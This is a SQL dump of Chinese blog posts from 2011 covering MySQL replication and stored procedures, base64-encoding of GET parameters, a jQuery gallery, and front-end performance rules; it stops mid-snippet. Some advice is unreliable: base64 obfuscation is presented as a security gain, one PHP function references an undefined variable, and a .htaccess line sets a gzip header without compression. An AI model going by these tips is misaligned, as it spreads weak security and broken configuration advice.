(65, '关于Mysql的两个实用技术', 'mysql-advanced', 4, '<p>paperen对mysql的接触是从玩php开始的，paperen并没有学过SQL，但是自学了一些，对于mysql其实也不是专研得太深，而最近又重新看一遍《PHP和MySql Web开发 第4版》才有发现mysql中有些东西paperen到现在还没有玩过~~所以现在paperen再亲自测试一下并拿出来跟大家分享一下，其实大家有这本书的话不妨自己翻开，再看看12，13章的内容，当然如果你是已经了解并玩得很熟了那么可以忽略了。</p><p>大概总结了下，这两章介绍了一些玩法有：mysql prepared，pear mdb2，权限分配，sql优化分析，备份与恢复数据库，主从同步数据库，innodb事务与外键，存储过程。都是一些很实用的技巧，而这里paperen只具体说说主从同步数据库与存储过程，其他技巧自己去查查资料吧。</p><p>主从同步数据库，这个概念应该很好理解，其实就是集群数据库的概念，在客户端看上去数据库只有一个，但是实质上不止一个，可能是多个数据库在维持，实质上说这个技巧是为了保证web平台的稳定而使用的，paperen觉得这个技巧并不是用来防止数据出错（数据出错站在mysql的层面来看是根本没法避免的，只能靠备份来预防）是为了提高可靠性。</p><!--more--><p>在《PHP和MySql Web开发 第4版》中这个技巧放在实现复制小节中，下面为引用书中的一段：</p><p>“复制是一个允许提供相同数据库的多个数据库服务器的技术。这样，可以载入共享并提高系统可靠性；如果有一个服务器停止运行，其他服务器还能继续工作。复制一旦设置成功，它也可以用作备份。”</p><p>paperen我也承认看书确实有点让人犯困……好吧，let''s do it~</p><p>你需要确定哪个机器上的数据库是主，而哪些机器是从。</p><p>#猪数据库192.168.1.17</p><p>#从数据库192.168.1.16</p><p>#同步192.168.1.17上的test数据库</p><p>#请保证同步之前主从服务器上的test数据库结构与数值都一致了</p><p>步骤一：修改mysql配置文件，将主从服务器上的mysql配置文件my.ini或my.cnf在[mysqld]下加入</p><p>log-bin = ** #定义二进制日志前缀，等你玩过一遍你就明白了</p><p>server-id = ** #定义服务器唯一ID，注意是唯一</p><p>#[主服务器/master上才有的配置]</p><p>binlog-do-db = ** &nbsp;需要备份的数据库</p><p>binlog-ignore-db = ** #[主/master上才配置这个] 不需要备份的数据库</p><p>slave-skip-errors #跳过错误</p><p>log-slave-updates #会将更新记录放到二进制文件里</p><p>#[从服务器/slave上才有的配置]</p><p>replicate-do-db = ** #需要备份的数据库</p><p>replicate-ignore-db = ** #不需要备份的数据库</p><p>master-connect-retry = ** #当主服务器连接失败时重连时间差（秒）</p><p>slave-skip-errors&nbsp;#跳过错误</p><p>log-slave-updates #同主选项说明一致</p><p>步骤二：为从服务器开一个用户（当然也可以不开使用最大权限的root，但是不是太好咯~）</p><p>使用sql命令或用phpmyadmin也可以</p><p>GRANT REPLICATION SLAVE ON * . * TO ''paperen''@''%'' IDENTIFIED BY ''useful'';</p><p>步骤三：重启主从服务器的mysql服务，如果重启服务失败可能是修改my.ini或者my.cnf错误了，需要排错一下</p><p>步骤四：获得主服务器数据库快照</p><p>在192.168.1.17中需要输入sql命令</p><p>flush tables with read lock;#该数据库的所有表的写操作将被阻塞，而读操作顺利进行（当然你需要进入到test数据库或者使用use dbname;后才执行该sql操作）</p><p>然后</p><p>show master status;</p><p>将会获得有关数据库快照的信息</p><p><a href="http://localhost/paperenblog/file/132" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/132" alt="20110211152424" title="上传于2011-02-11"></a></p><p>记下，FILE与Position的值，之后再执行</p><p>unlock tables；#解除读锁定</p><p>在从服务器中运行</p><p>change master to</p><p>master_host = ''192.168.1.17'',</p><p>master_user = ''paperen'',</p><p>master_password = ''useful'',</p><p>master_log-file = ''mysqlbin.00002'',</p><p>master_log_pos = 281;</p><p>之后再送入</p><p>start slave;</p><p>到这里就可以进行同步了，到主数据库去更新插入一些数据你会发现从数据库也会跟着更新与插入。</p><p>Tips：</p><p>1.如果最后从数据库的数据不能同步可以试试以下信息解决问题</p><p>show slave status;(phpmyadmin中)</p><p>show slave statusG（命令行下）</p><p>查看一下Slave_IO_Running与Slave_SQL_Running是否全为yes，大多数不成功都是因为其中一个状态不是yes导致的，故针对这两个状态进行排错。google一下就很多。下面放出两个。</p><p>Slave_SQL_Running:No <a href="http://jianzi0307.blog.163.com/blog/static/208120020091212532947/" target="_blank">http://jianzi0307.blog.163.com/blog/static/208120020091212532947/</a></p><p>Slave_IO_Running: No <a href="http://www.9enjoy.com/slave-io-running-no/" target="_blank">http://www.9enjoy.com/slave-io-running-no/</a></p><p>其实最好还是在mysql配置中加入一个选项 <strong>log-error = mysqlerr.txt</strong> 当出现某些问题时查看一下错误日志就明白了，还有提示，真系very good的~~</p><p>2.关于主从同步原理</p><p><a href="http://machael.blog.51cto.com/829462/239112" target="_blank">http://machael.blog.51cto.com/829462/239112</a></p><p>3.更多参考信息</p><p><a href="http://www.intgoo.com/10022.html" target="_blank">http://www.intgoo.com/10022.html</a></p><p>至于存储过程呢，其实也是相当简单，相对于主从同步来说是没那么复杂了。说明了就是在mysql层上建立了一个自定义1查询过程（函数），为了不用在服务器程序中写比较复杂的查询语句而已。看个例子你就明白了。</p><p>#有一个简单需求：查询商品表中价格超过某个价位商品的数量，这里就是定义了一个存储过程放在mysql那边，而不用自己写一条sql来查询。</p><pre>delimiter //<br />create procedure count_mycost (in scost float, out  total int)<br />BEGIN<br />SELECT count(distinct name)  into total<br />FROM `goods` <br />where cost  &gt;scost;<br />END<br />//<br />delimiter;</pre><p>当送入数据库后就可以使用</p><p>call count_mycost(6,@num);<br />select @num;<br /></p><p>获得数据了</p><p><a href="http://localhost/paperenblog/file/133" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/133" alt="20110211172749" title="上传于2011-02-11"></a></p><p>使用php代码就先送入call count_mycost(6,@num);后送入select @num;来获取数据。</p><pre>mysql_query("call count_mycost(6,@num)");<br />$res = mysql_query( "select @num" );<br />echo mysql_result($res, 0 );<br /></pre><p>貌似也不是很方便~~不过可能在实际中有些地方可以用到，统计什么的或者能派上用场，省了在服务端写太多的sql与代码。除了声明过程外你还可以声明一个函数，方法类似但是也有不同的地方，还可以配合使用declare，if等等。</p></p>', 2, 1, 479, 0, 0, 0, 1297417132, 0),
(66, '加密的GET参数', 'get-encode', 2, '<p>WEB驱动事件与交互的最基本的方法就是通过GET参数，我想你懂paperen说的是什么意思的。</p><p>www.example.com/news/?id=234</p><p>www.example.com/goods.php?id=2</p><!--more--><p>http://www.google.com.hk/search?hl=zh-CN&amp;newwindow=1&amp;safe=strict&amp;q=GET%E5%8F%82%E6%95%B0&amp;aq=f&amp;aqi=&amp;aql=&amp;oq=</p><p>简单来说就是那个问号后面的都可以称之为GET参数，因为这种形式会让浏览器向服务器请求时将问号后面的字符都加到请求数据中，只是那不是我们要了解的事情而已，而很直接的表现就是在地址栏看到这些很长的参数。</p><p>不知道大家有没有去修改这些参数的冲动，因为修改它们实在是太容易了，而且是暴露在地址栏的，我们都可以随便修改，或者将id=2改为id=test，但正如有写过web代码的人都应该知道一件事情就是“很可能这个参数会被用来做一些事情“，最常见的就是作为一个字符或者数字拼接到一条sql里面，然后查出相应的数据，或者根据该参数让程序反应不同的结果……</p><p>而重要的是，paperen我认为大部分这种暴露get参数带来的负面影响是，一些好奇心或者恶意的浏览者会通过这些参数对您的网站进行一些检测与攻击，显然这并不是网站运营与开发者想听到的消息。</p><p><a href="http://localhost/paperenblog/file/134" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/134" alt="20110223173446" title="上传于2011-02-23"></a></p><p>web服务器来说并不知道哪些请求是恶意的是非法的，因为服务器对每个请求都是平等的，但当然不是说100个浏览者中会有99个是带恶意的，相反，恶意性的浏览者可能只有1个，但就是这么只有1个才让我们感到害怕，因为我们不知道这个带恶意的浏览者会从我们的服务器获得什么信息，发现什么漏洞……所以这也说明了为什么我们要将我们的代码写得更加稳定更加强壮，特别是应对一些异常数据的时候，这也正是为什么在发布最后要经过一个测试的原因……好吧，下面就直接奔向主题算了。</p><p>paperen认为在一定程度上你可以去屏蔽get参数的表现方式来让那些对get参数敏感的人对你失去兴趣，you know，这并不是一个很高深的方案，别怕……</p><p>如果将</p><p>www.example.com/news/?id=3&amp;uid=45&amp;name=paperen</p><p>变为</p><p>www.example.com/news/?get=0qMZJevzDZaP9Wc77sh4uvhSrUXW0lYj13I4oxwNM6%</p><p>你觉得这个url给你感觉是什么……（paperen我会想OMG，这堆字符串真TMD BT了……很恶心），我们没法从这么一堆BT的字符串中想象它原来的格式是id=3&amp;uid=45&amp;name=paperen，没错这是个丑陋的URL，对seo有了解的人或者不推荐这么做，paperen认为在安全与seo之间你需要有个折中点，采取符合您的期望与要求的方案就可以了（不是讨论重点）。</p><p>paperen想这会在安全性上更加给力，因为大部分的浏览者（或者应该说是地球人）都很难去理解这串看上去毫无意义的参数。so下面提供一下实现的方法（其实真的很简单）。想象一下自己平时是怎样处理这些get参数的。</p><pre>&lt;?php<br />$id = isset( $_GET[''id''] ) ? intval( $_GET[''id''] ) : '''';<br />if ( $id ) {<br />    //do something<br />}<br />?&gt;<br />&lt;a href="example.php?id=164332"&gt;Link&lt;/a&gt;<br /></pre><p>然后我们需要一个加密算法（它也应该是可以解密的），很明显已经直接排除了md5与crypt，因为都是单向性的。故可以使用base64来实现这个，php对应的两个加解密函数分别是base64_encode与base64_decode。</p><p>最后一点是我们不是单纯对id使用这个加密，不单单是要让url变成这样。www.example.com/news/?id=Mw==&amp;uid=NDU=&amp;name=cGFwZXJlbg==，这样只是对参数数据进行了加密，但是有哪些参数还是暴露在外面。我们的目标是”只有一个参数“。或者可以这样写。</p><pre><br />&lt;?php<br /><br />//是否开启URL加密模式<br />define(''OPEN_URL_ENCODE'', true);<br />//加密类型<br />define(''GET_ENCODE_TYPE'', ''base64'');<br />//自定义GET接受标记<br />define(''GET_TAG'', ''get'');<br /><br />//需要传递的GET参数<br />$args = array(<br />    ''id'' =&gt; 1533,<br />    ''type'' =&gt; 2,<br />);<br /><br />//如果开启URL加密模式需要进行一些特殊处理<br />if ( OPEN_URL_ENCODE ) {<br />    $_GET = extract_arg( $_GET );<br />}<br /><br />//整理参数<br />function format_arg( $url, $args ) {<br />    return (OPEN_URL_ENCODE) ? $url . ''?'' . GET_TAG . ''='' . make_my_urlarg( arg_arr2str( $args ) ) : $url . ''?'' . $tmp;<br />}<br /><br />//还原参数<br />function extract_arg( $arr ) {<br />    if ( isset( $arr[GET_TAG] ) ) {<br />        return arg_arr2str( make_my_urlarg( $arr[GET_TAG] , true ), true );<br />    } else {<br />        return array('''');<br />    }<br />}<br /><br />//数组字符串互换<br />function arg_arr2str( $data, $is_str2arr = false ) {<br />    $tmp = '''';<br />    if ( $is_str2arr &amp;&amp; is_string( $data ) ) {<br />        $arr = explode(''&amp;'', $data);<br />        foreach( $arr as $index =&gt; $data ) {<br />            if ( false !== strpos($data, ''='') ) {<br />                list($k , $val) = explode(''='', $data);<br />                $tmp[$k] = $val;<br />            }<br />        }<br />    } else if( !$is_str2arr &amp;&amp; is_array( $data ) ) {<br />        foreach( $data as $k =&gt; $val ) $tmp .= ''&amp;'' . $k . ''='' . $val;<br />        $tmp = substr($tmp, 1);<br />    }<br />    return $tmp;<br />}<br /><br />//根据相应的算法加解密参数<br />function make_my_urlarg($str, $is_decode = false) {<br />    if ( ''base64'' == GET_ENCODE_TYPE ) {<br />        return ($is_decode) ? base64_decode($str) : base64_encode($str);<br />    }<br />}<br /><br />//还是一如既往地接收GET参数，感觉这个加解密处理与我们无关<br />$id = isset( $_GET[''id''] ) ? intval($_GET[''id'']) : '''';<br />$type = isset( $_GET[''type''] ) ? intval($_GET[''type'']) : '''';<br />if ( $id ) {<br />    //do something<br />}<br /><br />$url = format_arg(''example.php'', $args);<br />echo "&lt;p&gt;$url&lt;/p&gt;";<br /><br />print_r( $_GET );<br />echo ''&lt;p&gt;&lt;/p&gt;'';<br /><br />?&gt;<br />&lt;a href="&lt;?php echo $url; ?&gt;"&gt;Link&lt;/a&gt;<br /></pre><p>你能调用的函数其实就是format_arg与extract_arg，就这样简单已经给全局变量$_GET加上一层马甲。运行效果如下。</p><p><a href="http://localhost/paperenblog/file/135" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/135" alt="20110223190139" title="上传于2011-02-23"></a></p><p>对，我们还是可以一如既往地使用$_GET[''id'']来获取这个参数，但是原来的URL却变得有点不可看透了，当然从这个你可以延伸到其他超级变量上，比如POST(用在POST上不太好，原因是加甲是由服务端执行的，而大部分POST数据是变动的不像URL传参数这样是我们预定好的)，SESSION，COOKIE。或许用在COOKIE上也是一个不错的选择。</p><p>如果用JS控制页面跳转到某个带参数的URL时可能要有点折腾，只要你头脑有个概念：加甲是要靠服务端程序的，应该就好办了。</p><p>如果感觉使用base64加密还是会被识穿那么你可以使用以下这个函数作为加解密核心。</p><pre><br />/**<br /> * authcode 摘自UChome<br /> * @param string $string 明文<br /> * @param string $operation ENCODE加密/DECODE解密<br /> * @param string $key 密钥（可以在配置文件中定义）<br /> * @param string $expiry 有效期？<br /> * @return string<br /> */<br />function authcode($string, $operation = ''DECODE'', $key = '''', $expiry = 0) {<br /><br />    $ckey_length = 1;<br />    $key = md5($key ? $key : '''');<br />    $keya = md5(substr($key, 0, 16));<br />    $keyb = md5(substr($key, 16, 16));<br />    $keyc = $ckey_length ? ($operation == ''DECODE'' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '''';<br /><br />    $cryptkey = $keya . md5($keya.$keyc);<br />    $key_length = strlen($cryptkey);<br /><br />    $string = $operation == ''DECODE'' ? base64_decode(substr($string, $ckey_length)) : sprintf(''%010d'', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;<br />    $string_length = strlen($string);<br /><br />    $result = '''';<br />    $box = range(0, 255);<br /><br />    $rndkey = array();<br />    for($i = 0; $i &lt;= 255; $i++) {<br />        $rndkey[$i] = ord($cryptkey[$i % $key_length]);<br />    }<br /><br />    for($j = $i = 0; $i &lt; 256; $i++) {<br />        $j = ($j + $box[$i] + $rndkey[$i]) % 256;<br />        $tmp = $box[$i];<br />        $box[$i] = $box[$j];<br />        $box[$j] = $tmp;<br />    }<br /><br />    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {<br />        $a = ($a + 1) % 256;<br />        $j = ($j + $box[$a]) % 256;<br />        $tmp = $box[$a];<br />        $box[$a] = $box[$j];<br />        $box[$j] = $tmp;<br />        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br />    }<br /><br />    if($operation == ''DECODE'') {<br />        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {<br />            return substr($result, 26);<br />        } else {<br />            return '''';<br />        }<br />    } else {<br />        return $keyc.str_replace(''='', '''', base64_encode($result));<br />    }<br />}<br /></pre><p>还支持密钥，也就是说密钥不对也不能解密，很给力吧~~</p><p>下面是一个完整的DEMO，希望对你有帮助。</p><p><a href="http://iamlze.cn/demo/get-encode/" target="_blank">I AM HERE!这里</a></p></p>', 2, 1, 787, 1, 0, 0, 1298461271, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(67, '还是JS图片gallery', 'js-pic-gallery', 3, '<p>看到标题你都明白这次又是说啥了，还是JS图片展览的效果，but，这次同时附上<a href="http://www.psytopic.com/mag/" target="_blank"> psytopic.com</a> 里面的那个gallery（准确点来说是盗窃回来的），paperen弄来他们的js，css，同时搜索了关于lightory这个信息，准确点来说是个开发者（根据css文件开头的备注找到了这个线索），paperen当然也不确定是不是这个lightory（t.sina.com.cn/lightory），但可以肯定而且令我惊讶的是微博这位又是一个90后的杰出开发者（又让paperen觉得中国的IT未来一片光明，我们需要的只是创新而已），访问了<a href="http://lightory.net/" target="_blank"> 他的blog</a> 与摆摆书架（<a href="http://bookfor.us/" target="_blank">http://bookfor.us/</a>）paperen喜欢这样的UI，摆摆书架的玩法大家也可以了解下，挺有意思的。</p><p>多余的东西就到此为止了，说得有点多了……好吧，一开始就来个DEMO给大家看看（psytopic.com的那个）。</p><p><a href="http://localhost/paperenblog/file/136" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/136" alt="20110326212041" title="上传于2011-03-26"></a></p><!--more--><p><a href="http://iamlze.cn/demo/js-gallery/psy/" target="_blank">DEMO is here</a></p><p>这就是原版本的效果，觉得有些单调？可以访问，但老实说paperen就是喜欢这种简约的风格，paperen不倾向于那种华丽的色彩浓重的风格，大家不妨可以去psytopic的主站看看这个gallery与整个布局配合的效果，真的给人一种很舒服的感觉。因为并没有询问过psy网站就将它这个gallery拿下来，所以大家千万不要用浏览器查看这个demo的 style.css 文件与 script.js 文件啊~~~更不要将他们复制下来啊~~记住了，不要……</p><p>先不说代码是如何实现的，因为代码不是重要的，设计思想才是重要的。</p><p>总体上说，它这个是将所有的html结构都放出来的，就是说第一个图片展示与第二个，第三个的html结构都是一开始放出来的，只是使用了css对不“高亮”，不是当前的那些进行了隐藏。具体可以查看hilighted与displayNone这两个css，那么事情就变简单了，定时器执行一个操作：将下一个画廊主体的class去掉displayNone并加上hilighted，将现在是hilighted的画廊主体去掉其hilighted加上displayNone，ok！就是这么简单。so do it！</p><pre>function slideForward() {<br />    var a = $(".hilighted").attr("id");<br />    if (a) {<br />        var b = new Array();<br />        b = a.split("_");<br />        if (b[1] == panelTotal) {<br />            $(".hilighted").removeClass("hilighted").addClass("displayNone");<br />            $("#div_1").removeClass("displayNone").addClass("hilighted")<br />        } else {<br />            $(".hilighted").removeClass("hilighted").addClass("displayNone").next("li").removeClass("displayNone").addClass("hilighted")<br />        }<br />    }<br />};<br /></pre><p>slideForward函数，正如paperen上面说的思路，你可以分析一下这里的意思了。</p><pre>step1：获取当前“高亮”的画廊ID<br />step2：判断是否到达上限了<br />step3：<br />如果是到达上限了，第一个画廊被高亮，去除当前画廊主体的高亮并加上displayNone。<br />如果没到达上限则下一个画廊主体则去除displayNone并加上高亮，当前高亮的去掉高亮并加上displayNone<br /></pre><p>这里需要了解的是使用了画廊主题的ID来获取当前展示到第几个，div_1，div_2，div_3……用下划线来分割1，2，3……就能知道当前哪个高亮了，还有使用next，指代到一下个画廊主体，真的很简练。</p><p>至于那些翻页，暂停，播放的功能就更容易明白了。</p><pre>$(".turnleft").click(function () {<br />    var a = $(".hilighted").attr("id");<br />    var b = new Array();<br />    b = a.split("_");<br />    if (b[1] == 1) {<br />        $(".hilighted").removeClass("hilighted").addClass("displayNone");<br />        $("#div_" + panelTotal).removeClass("displayNone").addClass("hilighted")<br />    } else {<br />        $(".hilighted").removeClass("hilighted").addClass("displayNone").prev("li").removeClass("displayNone").addClass("hilighted")<br />    }<br />});<br />$(".turnright").click(function () {<br />    slideForward()<br />});<br />$(".player").click(function () {<br />    if ($(this).hasClass("stop")) {<br />        clearTimeout(timer);<br />        $(".stop").removeClass("stop").addClass("play");<br />        $("em").html("play")<br />    } else {<br />        setTimeout("slideFeature()", interval);<br />        $(".play").removeClass("play").addClass("stop");<br />        $("em").html("stop")<br />    }<br />});<br /></pre><p>这里要解析一下的是当目前player元素的class是stop时，则代表要停止自动播放功能，在代码上就是使用clearTimeout对定时器的ID，这里就是timer这个全局变量，相反是播放时重新设置定时器好了。原来的代码计时是写死了的，也就是说写固定了setTimeout("slideFeature()", 10000);paperen则将它抽出来放到一个全局变量里面，那么需要加长间隔或缩短间隔只需要修改interval这个变量即可。</p><p>而paperen也按照这种风格做了一个，跟它这个不同的是paperen一开始没有将所有画廊都输出到html中，而是调用js将相应数据装载到html结构里面。</p><p><a href="http://localhost/paperenblog/file/137" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/137" alt="20110326212113" title="上传于2011-03-26"></a></p><p><a href="http://iamlze.cn/demo/js-gallery/my/" target="_blank">DEMO is here！</a></p><p>所有代码都可以自己查看源代码获得，paperen想你应该知道什么意思的。</p><p>主要是调用到my_gallery这个函数，而gallery_action只是作为那些API（翻页，暂停，播放）的一个“驱动”程序或者可以这样形容吧，paperen这个的缺点可能是体现在预载上，因为在网速慢的情况下出现的情况是跳到下一张时图片仍在加载，并不会预先将所有图片加载好，在第一轮加载完毕之后就顺畅了。而好处是html结构倒是没那么长了~~你当然可以发挥你的想象力或者自己动手弄一个属于你自己的版本吧，其实代码的事情并没有你想象中那么难，try it and do it，you will make it！</p><p>哦~~当然上面所有代码都是基于jquery驱动的。</p><p><br /></p></p>', 2, 1, 503, 0, 0, 0, 1301144964, 0),
(68, '不要忽略了前端的性能', 'dont-forget-FrontEnd-performance', 4, '<p>将《高性能网站建设指南》读完了，感觉很好，这本书值得大家一读。让paperen对前端性能优化有了更多了解。<a href="http://stevesouders.com/" target="_blank">steve souders</a> 将所有法则都描述得很彻底，很简洁。书中一些观点更是让paperen深刻“只有10%-20%的最终用户响应时间花在了下载HTML文档上，其余的80%-90%时间花在了下载页面中的所有组件上”，“如果将后端响应时间缩短一半，整体响应时间只能减少5%-10%，如果关注前端性能，同样是将其响应时间减少一半，则整体响应时间可以减少40%-45%”，总结得真的很到位，更重要的是你在阅读过程中会通过例子自己体会到作者这些观点。</p><p>光看封面都挺有意思的，留意那只狗的比例。</p><p><a href="http://localhost/paperenblog/file/100" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/100" alt="20110327151826" title="上传于2012-04-15"></a></p><!--more--><p>书中的内容paperen在这里就不打算描述了~~想了解还倒不如自己买本书看看。paperen想倒不如来描述一下详细如何做吧，或者更好一点。</p><p>在开始之前建议大家熟悉一下使用浏览器一些装备，opera的Dragonfly，firefox的firebug，chrome的开发人员工具resources，IE的自己找吧……（paperen一般不用IE，tip：Dragonfly与chrome的开发人员工具都可以使用ctrl+shift+i，快速打开）paperen推荐使用firebug，因为可以为firefox安装一个组件很方便地给我们提供建议，组件叫<a href="https://developer.yahoo.com/yslow/" target="_blank">YSlow</a>，直接安装上就可以了，安装时看看能不能与您当前使用的firefox版本兼容就可以了（不兼容就升级firefox咯~）。</p><p><a href="http://localhost/paperenblog/file/101" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/101" alt="20110327171808" title="上传于2012-04-15"></a></p><p>但是YSlow是英文版的，对于英文一般的同学可能看得会有点难受，不过也不要紧，慢慢看吧，提高英文水平也是很重要的，特别对于IT这个领域。</p><p>YSlow里面的指标确实也不少，paperen不打算全部都解析一遍，毕竟没有那个水平而且还没有研究到那么深~paperen打算就解析一下以下这些，而且这些是最值得我们去改善的方面。</p><blockquote><p>1.Make fewer HTTP requests——减少HTTP请求数量</p><p>2.Add Expires headers——添加缓存头</p><p>3.Compress components——压缩组件</p><p>4.Put CSS at top——将css放在头部</p><p>5.Put JavaScript at bottom——将javascript放在底部</p><p>6.Avoid CSS expressions——避免css表达式</p><p>7.Make JavaScript and CSS external——javascript与css使用外链的方式</p><p>8.Minify JavaScript and CSS——javascript与css最小化</p><p>9.Remove duplicate JavaScript and CSS——移除重复的javascript与css</p><p>10.Configure entity tags (ETags)——配置ETags</p><p>11.Make AJAX cacheable——使AJAX可缓存</p></blockquote><p>1.对于第一点减少HTTP请求数量，之前paperen的 <a href="http://iamlze.cn/archive/about-the-speed/" target="_blank">关于网站打开速度那点事</a> 也提及到一点点，主要是有关图片的。</p><p><a href="http://localhost/paperenblog/file/71" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/71" alt="201006111276222856" title="上传于2010-06-11"></a></p><p>如果将图片都单独出来的话那么这里三张图片就是三次HTTP请求，但是如果将图片集在一起那么只有一次HTTP请求，减少了两次，我们可以使用CSS Sprite这种技巧去同时使用同一张图片但显示不同区域的内容。</p><p>CSS Sprite简单来说就是类似于下面这样：</p><pre>.icon{background:url(image/icons.gif);display:block;position:absolute}<br />.brainstorm_icon{background-position:-404px -32px;width:27px;height:32px;left:3px;top:7px}<br />.script_icon{background-position:0 0;width:32px;height:30px;left:0;top:7px}<br />.apple_icon{background-position:-32px 0;width:26px;height:32px;left:3px;top:5px}<br /></pre><p>改变backgroun-position就能显示不同区域的内容，当然要限定宽度与高度，在PS或fireworks里面度量时尺寸多大就设定为多大。</p><p>2.添加缓存头，这个或者可以说对于第一次浏览者来说没太大作用，这个技巧重要在浏览者之后的重复访问，可以大大地减少数据传送，加快速度。有大部分组件其实是不要时刻重新下载的，例如图片，css，js这些文件其实在第一次下载后，后面若网站没有对这些文件产生改变时其内容是不变的，那没有必要在以后访问时再重新下载一次，影响速度也浪费流量。</p><p>如果您服务器提供使用.htaccess文件的话可以在里面加上</p><pre>&lt;IfModule mod_expires.c&gt;<br />ExpiresActive on<br />&lt;FilesMatch ".(gif|jpg|jpeg|png|ico|js|css|ico)$"&gt;<br />ExpiresDefault "access plus 2 weeks"<br />&lt;/FilesMatch&gt;<br />&lt;/IfModule&gt;<br /></pre><p>关于更多设置可以看看这个 <a href="http://www.blogguy.cn/show-752-1.html" target="_blank">http://www.blogguy.cn/show-752-1.html</a>&nbsp;</p><p><a href="http://localhost/paperenblog/file/104" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/104" alt="20110327190103" title="上传于2012-04-15"></a></p><p>加上了关于缓存的配置后在第一次请求回应时，服务器会告诉浏览器该文件的过时日期，如果这个文件在这段时间内没有修改过那么完全可以使用本地缓存的文件而不用重新请求下载该文件，减少重复而无用的工作。注意查看响应头信息的Expires与Last-Modified，还有Cache-Control。建议最好自己动手试试，您会对结果感到满意的，但是有一点需要注意的是，不要为变动大的文件加上缓存配置，可能会得不偿失。</p><p><a href="http://localhost/paperenblog/file/103" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/103" alt="20110327190708" title="上传于2012-04-15"></a></p><p>使用缓存后，你可以看到总共215.4KB的数据里面有194.8KB被缓存的，那代表什么，我想您应该明白的！又减轻服务器压力又减少客户流量！<br /></p><p>3.关于压缩组件，要确认服务器是否有使用压缩，您可以查看响应头信息是否存在Content-Encoding，一般浏览器请求头部也会声明自己支持哪种压缩，Accept-Encoding &nbsp; &nbsp;gzip, deflate。可以查看上上张图片，不过paperen并没有开启压缩，YSlow也已经提示了，大家想要实现gzip压缩可以在.htaccess文件中加上</p><pre>Header set Content-Encoding gzip</pre><p>但使用压缩后的js与css需要进行一些特殊的处理，可以查看一下 <a href="http://www.cbmland.com/post/522/optimized-wordpress-notes-1.html" target="_blank">这篇文章</a> ，要对js与css在传送前重定向一下到一个php文件进行一下处理，paperen觉得第一个评论就已经很值得思考，而博主回复得也很到位。</p><p>4.将Css放到头部，或者您只需要记住这是一个规则，如果要解析为什么的话，可以查阅一下paperen提到的那本书的规则5，因为这归根于浏览器解析页面的原理。</p><p>5.将javascript放到底部，将javascript放在body标记结束之前是最好的做法，正如书中说的“脚本会阻塞对其后面内容的呈现，脚本会阻塞对其后面组件的下载”，如果您将大量的javascript放在头部，这样可能会让浏览者处于一个白屏状态（如果js文件下载得不是很快的话），会让他们觉得慢。</p><p>不妨可以看看paperen的关于页面，调用了google地图来显示paperen的位置，结果有时候会让边栏无法显示，因为google的js加载不过去……如果将google地图的js放到body标签结束之前就不会这样了。</p><p><a href="http://localhost/paperenblog/file/102" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/102" alt="20110327193714" title="上传于2012-04-15"></a></p><p><br /></p><p>6.避免在css中使用表达式，paperen很久之前就有一篇东西用到这个css表达式<a href="http://iamlze.cn//archive/perfect-popubox/" target="_blank">完美的弹出层</a>，现在paperen倒觉得有点疑问为啥当时会使用完美这个形容词……里面有一条css是这样写的。</p><pre>_top:expression(eval(document.compatMode &amp;&amp; document.compatMode==''CSS1Compat'') ? documentElement.scrollTop + (document.documentElement.clientHeight-this.offsetHeight)/2 : document.body.scrollTop + (document.body.clientHeight - this.clientHeight)/2);</pre><p>OMG！真可够长的，而这样的东西就是css的表达式，要避免或者尽量少用吧。</p><p>7.对javascript与css使用外链的方式调用，paperen觉得应该要加上尽量这个形容词吧，因为有些js不能避免的会写到页面上，如果针对一些独特的页面的话，但是总体来说还是建议使用外链的方式，如果是大的项目要将哪些是基本的js分离出来，因为这些基本的js是不会变动频繁的，固能更好地被缓存，而css的话如果实在不是太大，全部写到一个文件好了，如果网站有很多不同的频道而且风格也不是相同，那么就要对css进行一些调整了，把最基本的样式挑离出来单独一个文件，正如处理刚才说的处理js的方法差不多，不同频道就再载入相应的css文件，基本的css再第一次加载后就不会变了，这样还是可以接受的。</p><p>8.javascript与css最小化，这里直接放出两个工具吧。<a href="http://www.crockford.com/javascript/jsmin.html" target="_blank">JSmin</a> 与 <a href="http://www.csscompressor.com/" target="_blank">csscompressor</a> ，css那个没什么可提的了，JSmin的使用在网页上已经说得很清楚，只是是英文的。顺便也提一下怎用吧~~为了英文不是很懂的朋友们。</p><p>最下面有个Get Minified，点击那个zip file containing an MS-DOS.exe file就可以下载到一个压缩包了，解压后有个exe的（还有个源文件，有兴趣可以看看代码）将jsmin.exe与一个未最小化的js放到您自己觉得方便的目录下，然后打开cmd（就是那个黑屏的控制台），切换到jsmin.exe路径下然后使用以下的命令。</p><pre>jsmin &lt;fulljslint.js &gt;jslint.js "(c)2002 Douglas Crockford"</pre><p>这是个原文的例子，fulljslint.js文件就是未最小化之前的js文件，jslint.js则是最小化后的文件，后面双引号的是加入一些注释什么的。（您当然可以配置系统的环境变量来实现不用次次都切换到具体目录就能使用这个命令，在Path中加上您存放jsmin.exe的那个路径就可以了）</p><p><a href="http://localhost/paperenblog/file/138" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/138" alt="20110327200148" title="上传于2011-03-27"></a></p><p>9.移除重复的javascript与css，这个其实很明了啦，一个js函数不要同时写两遍，css属性不要有多余的。比如：</p><pre>h1{font-size:14px;}<br />h2{font-size:14px;color:#C00;}<br 